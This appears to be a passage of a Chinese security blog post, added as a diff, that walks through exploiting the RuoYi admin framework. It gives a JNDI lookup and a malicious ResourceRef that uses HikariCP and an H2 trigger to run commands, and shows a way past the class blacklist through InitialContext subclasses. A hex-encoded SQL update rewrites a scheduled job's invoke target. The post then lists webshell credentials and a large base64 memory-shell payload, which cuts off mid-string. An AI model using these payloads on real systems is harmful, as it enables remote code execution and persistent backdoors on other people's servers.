+<p>太多了太酷了</p>
+<p><img src="image-20241026194802637.png" srcset="/img/loading.gif" lazyload alt="image-20241026194802637"></p>
+<p>随便找一个</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.jndi.JndiTemplate.lookup(<span class="hljs-string">&#x27;ldap://127.0.0.1:1389/remoteExploit8&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20241026194959880.png" srcset="/img/loading.gif" lazyload alt="image-20241026194959880"></p>
+<p>执行后也是可以的，要是高版本也很简单，看我的补天大会上的ppt。直接上才艺, 返回一个恶意reference</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ruoyiref</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;com.zaxxer.hikari.HikariJNDIFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                    <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;)\n&quot;</span> +<br>                    <span class="hljs-string">&quot;$$\n&quot;</span>;<br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;jdbcUrl&quot;</span>, JDBC_URL));<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1097</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;exp&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="4-7-8"><a href="#4-7-8" class="headerlink" title="4.7.8"></a>4.7.8</h4><p>忘记说了 </p>
+<p>com.ruoyi.quartz.util.JobInvokeUtil#getMethodParams</p>
+<p>参数执行是下面几个类型</p>
+<p><img src="image-20241026195221549.png" srcset="/img/loading.gif" lazyload alt="image-20241026195221549"></p>
+<p>这个版本限制了只白名单只能是com.ruoyi开头的类，且不在黑名单中就行。</p>
+<p>网上公开就是通过sql去改sys_job中的invoke_target。</p>
+<p>com.ruoyi.generator.service.impl.GenTableServiceImpl#createTable</p>
+<p><img src="image-20241026224026324.png" srcset="/img/loading.gif" lazyload alt="image-20241026224026324"></p>
+<p>执行sql语句</p>
+<p><img src="image-20241026224039450.png" srcset="/img/loading.gif" lazyload alt="image-20241026224039450"></p>
+<p>无敌</p>
+<p>也就是空insert或者update设置一下invoke_target就行了</p>
+<p>可以给一个提示，我们知道javax.naming.InitialContext 经常在黑名单中，其实可以用它的子类来进行绕过</p>
+<p><img src="image-20241026231352728.png" srcset="/img/loading.gif" lazyload alt="image-20241026231352728"></p>
+<p>javax.naming.directory.InitialDirContext</p>
+<p>javax.naming.ldap.InitialLdapContext</p>
+<p>都是可以的，这样轻松就绕过黑名单了</p>
+<p><img src="image-20241026231726022.png" srcset="/img/loading.gif" lazyload alt="image-20241026231726022"></p>
+<p>转hex</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e6c6461702e496e697469616c4c646170436f6e746578742e6c6f6f6b75702827726d693a2f2f3132372e302e302e313a313039372f6578702729 WHERE job_id = 1;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>执行后 </p>
+<p><img src="image-20241026232044514.png" srcset="/img/loading.gif" lazyload alt="image-20241026232044514"></p>
+<p>id为1的已修改完成，然后执行就行。</p>
+<p>这里只能通过SpringUtils.getBean(beanName); 触发，不能放射调用, 没有构造方法.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java">加密器: JAVA_AES_BASE64<br>密码: Azlvjmc<br>密钥: Fbwgkux<br>请求路径: <span class="hljs-comment">/*</span><br><span class="hljs-comment">请求头: Referer: Kpziyci</span><br><span class="hljs-comment">脚本类型: JSP</span><br><span class="hljs-comment">http://127.0.0.1:8088/favicon.ico</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">package com.ruoyi;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">import com.alibaba.fastjson.JSONArray;</span><br><span class="hljs-comment">import com.alibaba.fastjson.JSONObject;</span><br><span class="hljs-comment">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="hljs-comment">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="hljs-comment">import com.sun.rowset.JdbcRowSetImpl;</span><br><span class="hljs-comment">import org.apache.ibatis.javassist.ClassPool;</span><br><span class="hljs-comment">import org.apache.ibatis.javassist.CtClass;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">import javax.management.BadAttributeValueExpException;</span><br><span class="hljs-comment">import java.io.*;</span><br><span class="hljs-comment">import java.lang.reflect.Field;</span><br><span class="hljs-comment">import java.util.Base64;</span><br><span class="hljs-comment">import java.util.HashMap;</span><br><span class="hljs-comment">import java.util.Hashtable;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">public class fj &#123;</span><br><span class="hljs-comment">    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123;</span><br><span class="hljs-comment">        final Field field = getField(obj.getClass(), fieldName);</span><br><span class="hljs-comment">        field.set(obj, value);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123;</span><br><span class="hljs-comment">        Field field = null;</span><br><span class="hljs-comment">        try &#123;</span><br><span class="hljs-comment">            field = clazz.getDeclaredField(fieldName);</span><br><span class="hljs-comment">            field.setAccessible(true);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        catch (NoSuchFieldException ex) &#123;</span><br><span class="hljs-comment">            if (clazz.getSuperclass() != null)</span><br><span class="hljs-comment">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return field;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    public static void main(String[] args) throws Exception&#123;</span><br><span class="hljs-comment">        byte[] decode = Base64.getDecoder().decode(&quot;yv66vgAAADEBSAEAKG9yZy9zcHJpbmdmcmFtZXdvcmsvaXovU2VyaWFsaXphdGlvblV0aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACpMb3JnL3NwcmluZ2ZyYW1ld29yay9pei9TZXJpYWxpemF0aW9uVXRpbDsBAAIvKggADAEADGdldENsYXNzTmFtZQEAMm9yZy5hcGFjaGUubG9nZ2luZy5XZWJTb2NrZXRVcGdyYWRlT2t1a0ludGVyY2VwdG9yCAAPAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwEAE2phdmEvaW8vSU9FeGNlcHRpb24HABMBABBqYXZhL2xhbmcvU3RyaW5nBwAVAQ9ESDRzSUFBQUFBQUFBQUpWWENWd2MxUjMrSHJzd3k3SW1FUklpSmpHSG1pd3NzQ1FpU2NBRFNGQXdMSWtoRWtuYTJtRVpsZzNMN2pvN3kyWFVXby9hTTYyMWh6MXNtN2FtUjJ5ajBRVk0xZlJRVzN2Wnc5clcxbDcyMU5yMHJxMkszNXVaWFJaWVRQcjd3Y3pzZS8veisxL3ZQZjdLQXc4QldDOThBaHRpZXNpdnh0Vmd2K2FQeEVLaGNEVGszNjMxZE1hQ0E1cHhSVHlrcTczYTlvSGtRRnZVMFBTZ0ZqZGl1Z0loc0dTZk9xVDZJeXJKdDBUVVJLSTlSa0p1T1FRMlNwR0p1RTVSZmJvNnFBM0g5QUgvc05ialQyajZVRVF6L0UySjBXaXdWWTMyUmpSOWh0eDhnWUlMd3RHd2NaR0F3MXZlSmVEY0V1dlZCQmEyaDZOYVIzS3dSOU4zcVQwUnJoUzN4NEpxcEV2VncvSzN2ZWcwK3NNSmdkcjIvOStwQmc4VXVOeHdZb0hBbWQ3Mm5PNDFTSlBFbU1EU2VmYWxrRVZTU0FscHBrazZEUWxHY3pJY01URmE0a2FwVk9PTWsxTzZNcHVTY3M1QVdTSHljQ1lSVWVOeExkb3JVT1dkUzFnK1o4bldRaEhMc1VJcU9vdFlEbWlqSHF5eVJLNFdjQmt4aTFoZ3NYZXVDUEtlalhNazc3bmtIZXc5WDJEdEtla200enA0M1ZSU0xyOU1kY3d4Y1RuenhidTN1WHcyYWcwQ2VjRWVQdlkyQ3hUMWFuMk1zcmxCOUVqZjFqYVh3NFAxMkNBUlBvOXlSd1FVMHUwcGwvd2wwNlF0SXpLbzRWaFV3VWFTQmFuZUZEVGlEK3FqakxaL1N6amVUNHdZZ2lGVnIwMXZ6MkxtdHFBbFlwRC9leFRVMkNwbUNWSFFKSEJhcDZFR0J3SnEzRTVFUjFOTHB3dGI2VlJJTTlxaUNVT05CcmxjUGkrS3N5M3o0QkpjNmtZeldnVld6aUJJeExXZ3YxTUw2cHF4VFJ2dDVDOEZsd2tzbWkxWVFUc0RUZlhObzRaR041eGVvdVJCQjdhN0VjQU9DK0VjNW5USkhON3B4alowa2trV295UnRzeWdUV2pDcGg0MVJQMVdicEZlZ1MxcTVtNEhvalYwU2pxb1JKcXdNdGRUVmpUMXljNjlBWVZ6WHJJSVg2UFhhSHFmYlFiOWh4UDJ0ZkhSYUN6dTFxNU5hd21nNEtWa2lIb3NtdElZc0o3YjM3Tk9DUmtQNUhvRlYwNnRXQUl5d0txT2FsUnRYemFTS1JMU1FHbWtLQnJWRUlvdEtaZmo3WmxhcHJZWWI5Q2M3cGp1MXZnaDN3a1BhOXJpbXo5VFhJRXRaMTdjbkNlaEtpeWNjODh2b05PbTZPc3IxZU5KZ0ZEUjFrS1JLZ2xhUWl5Yk9qNE5KSWJPNFZ6Vm9wcUpieUFtc08wV0ltU0c2RFdQYWtWTUFuSnI2cmU0dGNOWnJHNmZnYW9GelQ4a1lCY3pTdGFkbWdvTGtqSlMzQXFKZ1dHREZheUtyWU5SV2N2S0FLYmhHd04ydnljN2V3VG5td2JWV1M3dU9DYzNDYWpWM1BIZ1R2RVV3Y0FPcjNTTHVVaU5KVXQ5b1VkOUVrSU94cUtHR28zUncyWXpSMHEvcW5kSjdkZ2NtclFlMzRDMnlPbStsWGlyb1RLZkFHbS81eVpMQWc3Zmg3ZEtNZHdoNHlMdERsYVBYa1BhOXk3THZBSzN1cWF2ZHFnWE5rVnFhcXhmSnFuMFBicE1kL0wwZW5JODYrZlUreGp1dWprWTQ0bHo0Z0NXK3lTQkhUOUxRVGo0YTdHTHg0QTU4cUFnNlBteTFKYnZQbDNoejlmaVA0azQzUnZBeFR2NVptd28rSWJBZ3pXK05YWUd5dVZJeUUvbVQrSlFiQi9GcDZVcUpCMVdvbGwrZm9SK0pHWDZzeStGSGp0YkNwdmM1ZkY0NmNwaFJpcWRoVHJqd0JZbnlZVGZHNUd3dmltckQwNDEvNXBUTklISXZqa3JUN3VPSkl5c2xrMnhWZzFwV0dxWUV6c2cyYmxlL0hodVdnOGJ1MWhOdWpHT1M3WVdwcEVZU2N0am02b2tlSE1PWEpLd1BXdm03bTUxY2dyYzBiUnlMWmdmZHRqZG8zOE00WG9RaGZKbjBpV1JQd2o0eWxIcG5EdWJNN1A4cXZpYXo5NUgwTEo0cFQ4RmpBdm5EOG51V2hWbWo1eHQ0M0kydjQ1dlNUQjQraW94WXBvdzkrSTZjWFdQNExrUFhveWEwdXRxV2FEcVhaeDR1TWhaOUQ5K1h3ZjZCVkRpZnpVOUttMy9FV0dZUUo0SXJaczI3QU10TURXbGJ3eUdyYlRvNGZ2a01iRDNmaGFkWjFhOUJyZURuQXV2bkw1SjVkTWdUd0MvY2VBYS9aR0FqV2pSazlKdUg0allQZm8zZlNKdWY1VVl5enRhdldjY2dSb1VJL2c2L2wxeC9ZTktaNGdkVm85L2ZIQTdKczI1SVJ1RlBaT3MxZFhqd3ZFVDBHZnhaRHUwMlltaW0wMS9jZUE0bjVCbndTZm4xTnpNTVYvQVFxbThoNmg3OFE1NE5BL2dudFZvQllBNFZXQUVST0QzSEdVOGVzdXA0eXVzaHNQbERzam5hemJzNmFZUWoxYzBtcXdzdlUyQmZ6R3kxbkJrbjZTcnBUakhGd09HZ0VGYkh0TzF4Q1Y1RGl2Zk9JVmRFdnBYNkFjM29qL0ZJM1poRHkxeTJiTDI2TlREOGxvUUdqMUNFU3hwUXlLVGZPN2ZxRkZIRTRwMlBYUkduRWJwd2RDZzJRSmMzNTZqYUhDSnpkUkt4VUN4eWl3WGlkUFpHemNSZ2wzM0Nkd2xlUlVvVHlXajFZRGdSckc1dTZteEoxdzFoV2lLYmh2bkRKWmJLTTV4bXgxT0NhVTBLVXNsTGlMWGpFc3ZuU3N2UThhYmhzZWlhazMxOWNtVVZlLzBGd1loOXBWT2F4aUpEK3dhRExuRTJFK0M4OWVyNnVwcSt6ZWZWYk42d29YZHpuVXV3NEJVT1pFMlhyT3Y0WTF0OExEd2FETHRFT1ZhempKMmdJY2hIb2J4YjhBTHJrcmNrODczS2ZBczVvTTMzamVhN2tGKzgxUEZaeUY5TmxDRDRMcWtZeDhLS0V1RzlIOWZ6VlhFL2JyNkh5M25NSTBCMkMvRG1WSXdWS09LWHgyTGgrelJUTUs5M3RyZ0lLU1Z0VFlWdkhJdG55anVHMHU1eExMMFh5MUpZZVMvVzhKbkMyZ2xVSEVYbHRLNEZjUEM1aXRKWHc0ODFwcjVTUzZhdFQzNmRUbHQ0MEpSenk5WjhJWUdRVklVVlBvZnZvWEhVSHNtSUxERE5YWnNscWpBanFwQktha3hSbk91MnFLZkk0ZVRiVjl3eWdiYU9xdVYzUUhFZWdqUC9HTFoxbTRaZlh0d3lqbDBwWEZubFMrRjFSenJFRVZNRnIzbllSUHZkcHFKOFBpc3Bxb3BlVkhQSGozS3Fra2JVY3ErQXE1dFJUK3B5bXRTQUMweS9mUm5EZlBTb3hwVHF3MFc0bURSYitFMnFLU3lFVTBHZWdrYWg4Q0loSDFQY3lsN2pSN09Zd2xJNDdFVkp0WW5TWG84M1VCS2R6UE9ZS1FPYzhGWGNoK3NuOGVZOFBJcG5wMy93NCtZVTNub0hudkJONHAwQzlVNGZJemVKZCtkaEFyZlg1MWVVNVR0U2VIOTlmcG16K0lPVCtFZ2VIc01hK1gwTWVkMFZLWHc4aGJ2R2NhZ3NQNFhQVHVKdUJ3N2hKbC94Rjh2eUozSEV3Wms3eGx5NHA3NGd3MzBjQjFPNHYxNDVoSVgxcm1NWTd5NXpqZU9CaDh1VXNvSVVIdHBkcHZqa3EzSVNYeEU4SVZRNkZpMUs0ZEVVdmxXbXBQQnRlNzFDMGo3aHBGa1QrQ0gzTXRTUytDa3VPQTQ3RDh1aktnN2dOcnpSZnZmWUVkdUp4WHpXTWU4Mk1pYWIrTnlNUmthb25kRVpZRFNTak1OMUxKZ0QyRXF1WnR6T2lOeUpGdHlGUzNFM1dua3VhTU1qdUF4UDg1YjRQRWZCQzlodVJydVAwZzlRUnhDOXJKVGIrVXZqbW91eW9naWhuNWx3SnkrZzFtNDVKWVN4aittM2thZVhBV2FBektJVG1hdzR3UW9iTkxQaUJMbGpaaktmUUp5OERqTS82cEQvTWdZVWNLSTFUakhsRlRQK25MWkRDa2FzWllXSEJXYkQvcGRReExVWEVYaVI4bjRzRTRqdlRXWWI4ZHFGd0p3M3M3Skd0QmYvYkFLL0NsUXlzSmM3K1BodENuODhodWU2blpVcHZEQ092MHFBLzU3Q3Y5ckpFdkRKYW1BR01mUFQxWEFXZlFOMmNiV0xudS9HRWx6Si9UMms2R1p0N0RWeFdrVmFGNnZpSXZ6RXJ2Y0x6WWFWUjRxZjhrdVlIcFlnYjRwczlDckFQeXV2YVN6UE5GWmlpNERaRFlIOU5QcVZDWkVYcUN3UlRuRmNGS1NFdTVKdlQwb1VkMVF4UVV2RVl1ZURPTmp0S0c3czVGNFZmNHgwT3lyNFhYd2NBWHJTMEZFaVNrMEpNak9kWlU2VDZZeHNwakxuSEs1OFZzb1JzdzFlekNUWlJLT1RQTGFsZ2RqQVVBSlhjYmVIemdiWlZIdEpGeUdsUnNvUTA2Y2ZPNWdDU1FaL2hJa3d4bkJMY0ZvSjRISWVQdjV0aHRyRnRQd1BYcVNVSFRqWFhIT1NzOXBlMjhMaythL2RVUGJqZndSU2dqaUdseklnbHNzMllyYUp4alNJVTJ5QVR2dTMyU3Y0bUowWnZBVFpJSGZiSU4rYUJmS3kzQ0N2c1BFS3pBVzUwZm9qYUUyRWV1VWNxRmRuczg2Q2VwcDNHdkFXd3JTSlZYZ0RicG9GK05YY1RSSzJJWUk0VExyclNUbEN5akVDZUExemNqOTVyaVBYdGJ4czNwQUZlTGtvc3dGdnRNSHRnczljYzVLejFsNXJZNmFtQWIrVmdGdFpld3NCcjhrR3ZOWE8ya1liOEFZSnVQazdOK0F1c1NZenAxdk1rcUNnRW5IT1VTd3JFV3VQWXMzSkpxcklURzhQYmZMaVRPQlZHQytNcytZV0FBQT0IABcBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMABkAGgoAFgAbAQADKClWAQAHY29udGV4dAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAC2ludGVyY2VwdG9yDAAZAB0KAAQAIQEACmdldENvbnRleHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAIwAkCgACACUBAA5nZXRJbnRlcmNlcHRvcgwAJwAkCgACACgBAA5hZGRJbnRlcmNlcHRvcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAKgArCgACACwBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAuAQARcmVxdWVzdEF0dHJpYnV0ZXMBAAtodHRwcmVxdWVzdAEAB3Nlc3Npb24BAA5zZXJ2bGV0Q29udGV4dAEAE2FwcGxpY2F0aW9uQ29udGV4dHMBABlMamF2YS91dGlsL0xpbmtlZEhhc2hTZXQ7AQASYXBwbGljYXRpb25Db250ZXh0AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAOQEAEGphdmEvbGFuZy9PYmplY3QHADsBAA1TdGFja01hcFRhYmxlAQAQamF2YS9sYW5nL1RocmVhZAcAPgEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAQABBCgA/AEIBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABEAEUKAD8ARgEAPG9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLmNvbnRleHQucmVxdWVzdC5SZXF1ZXN0Q29udGV4dEhvbGRlcggASAEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAEoASwoAOgBMAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMIAE4BAAxpbnZva2VNZXRob2QBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAUABRCgACAFIBAApnZXRSZXF1ZXN0CABUAQAKZ2V0U2Vzc2lvbggAVgEAEWdldFNlcnZsZXRDb250ZXh0CABYAQBCb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5zdXBwb3J0LldlYkFwcGxpY2F0aW9uQ29udGV4dFV0aWxzCABaAQAYZ2V0V2ViQXBwbGljYXRpb25Db250ZXh0CABcAQAPamF2YS9sYW5nL0NsYXNzBwBeAQAcamF2YXguc2VydmxldC5TZXJ2bGV0Q29udGV4dAgAYAEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAUABiCgACAGMBADFvcmcuc3ByaW5nZnJhbWV3b3JrLmNvbnRleHQuc3VwcG9ydC5MaXZlQmVhbnNWaWV3CABlAQALbmV3SW5zdGFuY2UMAGcAJAoAXwBoCAA0AQAFZ2V0RlYMAGsAUQoAAgBsAQAXamF2YS91dGlsL0xpbmtlZEhhc2hTZXQHAG4BAAhpdGVyYXRvcgEAFigpTGphdmEvdXRpbC9JdGVyYXRvcjsMAHAAcQoAbwByAQASamF2YS91dGlsL0l0ZXJhdG9yBwB0AQAEbmV4dAwAdgAkCwB1AHcBADVvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LldlYkFwcGxpY2F0aW9uQ29udGV4dAgAeQEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAewB8CgA8AH0BABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoMAH8AgAoAXwCBAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24HAIMBACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwCFAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcAhwEAIGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uBwCJAQATamF2YS9sYW5nL1Rocm93YWJsZQcAiwEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247DAAOAAYKAAIAlQwAEQAGCgACAJcBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDACZAJoKAAIAmwEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDACdAJ4KAAIAnwgAjwcAjgEAEWphdmEvbGFuZy9JbnRlZ2VyBwCjAQAEVFlQRQwApQCSCQCkAKYBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAKgAqQoAXwCqAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwCsAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAK4ArwoArQCwAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMALIAswoApAC0AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAC2ALcKAK0AuAEAFmFic3RyYWN0SGFuZGxlck1hcHBpbmcBABNhZGFwdGVkSW50ZXJjZXB0b3JzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAKUxqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAHZ2V0QmVhbggAvwEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcIAMEIALsBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwDEAQADYWRkAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaDADGAMcKAMUAyAEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCADQAQAHZm9yTmFtZQwA0gBLCgBfANMBAAxkZWNvZGVCdWZmZXIIANUBAAlnZXRNZXRob2QMANcAqQoAXwDYAQAQamF2YS51dGlsLkJhc2U2NAgA2gEACmdldERlY29kZXIIANwBAAZkZWNvZGUIAN4BAA5jb21wcmVzc2VkRGF0YQEAA291dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAJpbgEAHkxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtOwEABnVuZ3ppcAEAH0xqYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbTsBAAZidWZmZXIBAAFuAQABSQEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwDqAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcA7AEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwDuCgDrACEBAAUoW0IpVgwAGQDxCgDtAPIBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABkA9AoA7wD1AQAEcmVhZAEABShbQilJDAD3APgKAO8A+QEABXdyaXRlAQAHKFtCSUkpVgwA+wD8CgDrAP0BAAt0b0J5dGVBcnJheQEABCgpW0IMAP8BAAoA6wEBAQAFc2V0RlYBADkoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAR2YXIwAQAEdmFyMQEAA3ZhbAEABGdldEYBAD8oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAQgBCQoAAgEKAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAQwBAANzZXQMAQ4AKwoBDQEPAQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7CgENALABAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwBFgEXCgENARgBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HARoB